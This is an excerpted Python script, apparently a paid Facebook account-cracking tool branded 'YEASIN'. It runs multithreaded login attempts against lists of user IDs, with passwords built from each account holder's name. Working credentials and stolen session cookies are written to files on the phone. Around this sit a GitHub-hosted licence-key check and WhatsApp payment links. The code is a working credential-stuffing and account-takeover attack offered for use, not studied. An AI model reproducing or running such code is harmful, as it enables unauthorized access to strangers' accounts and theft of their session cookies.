#!/usr/bin/python
#Dec YEASIN ARAFAT CHOWDHURY
#Original written YEASIN
#YEASIN(ATTITUDE KING YEASIN) Brand
#Feel YEASIN POWER
...
from concurrent.futures import ThreadPoolExecutor as mogidYEASIN
from string import * 
...
sys.stdout.write('\x1b]2; YEASIN\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
...
logo ="""\033[1;32m
 ...
 __     ________           _____ _____ _   _ 
 \ \   / /  ____|   /\    / ____|_   _| \ | |
  \ \_/ /| |__     /  \  | (___   | | |  \| |
   \   / |  __|   / /\ \  \___ \  | | | . ` |
    | |  | |____ / ____ \ ____) |_| |_| |\  |
    |_|  |______/_/    \_\_____/|_____|_| \_|
                                             
     
\033[1;32mD \033[1;33mA \033[1;34mN \033[1;35mG \033[1;36mE \033[1;37mR~~~\033[1;37m[ALL TIME \033[1;37m FIRE🔥🔥]
\033[1;32m--------------------------------------------------------
\033[1;37m[\033[1;31m•\033[1;37m]\033[1;31mDEVELOPER    :   \033[1;31mYEASIN
\033[1;37m[\033[1;32m•\033[1;37m]\033[1;32mTOOLS        :   \033[1;32mFILE-CLONE
\033[1;37m[\033[1;33m•\033[1;37m]\033[1;33mVERSION      :   \033[1;33m 0.1
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print("-----------------------------------------------------")
        input("Press enter to back YEASIN Menu ")
        exit()
...
def YEASIN():   
    ...
    print(f'[3] FOLLOW MY FACRBOOK ')
    print('')
    select = input('Select Menu > ')
    if select =='1':
        method_crack()
    elif select =='2':
        os.system('xdg-open https://chat.whatsapp.com/BrjojQHxQrjHisbpnGQywX')
        pass
    elif select =='3':
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r\033[1;32m[YEASIN] \033[1;33m{loop} \033[1;32m| \033[1;34mM1 OK/CP \033[1;35m{len(oks)}/{len(cps)} | \033[1;36m{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);YEASINb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={YEASINb};{ckkk}"
                    print(f"\r{R} [YEASIN-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/YEASIN_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/YEASIN_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [YEASIN-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/YEASIN_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r\033[1;32m[YEASIN] \033[1;33m{loop} \033[1;32m| \033[1;34mM2 OK/CP \033[1;35m{len(oks)}/{len(cps)} | \033[1;36m{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [YEASIN-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/YEASIN_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/YEASIN_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #print(f"\r{A} [YEASIN-CP] {sid} | {ps} {S}")
                    cps.append(sid)
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r\033[1;32m[YEASIN] \033[1;33m{loop} \033[1;32m| \033[1;34mM3 OK/CP \033[1;35m{len(oks)}/{len(cps)} | \033[1;36m{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [YEASIN-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/YEASIN_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
    ...
    def pasw(self):       
            ...
            print("-----------------------------------------------------")
            with mogidYEASIN(max_workers=30) as YEASINworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                YEASINworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                YEASINworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                YEASINworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                YEASINworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)   
...
def YEASIN_menu():
    ...
    id = "5".join(uuid)
    print(logo)
    DARK=requests.get("https://github.com/apon200490/aproovaal.txt/blob/main/aproovaal.txt").text
    if id in DARK:
        YEASIN()
    else:
        os.system("clear")
        ...
        print ("")
        print("   7 Day-150 BDT             Your Key is Not Approved ")
        print("   15 Day-250 BDT           Copy And Send Key To Admin")
        print ("")
        ...
        os.system("xdg-open https://wa.me/+880643537105")
        YEASIN_menu()   
YEASIN_menu()
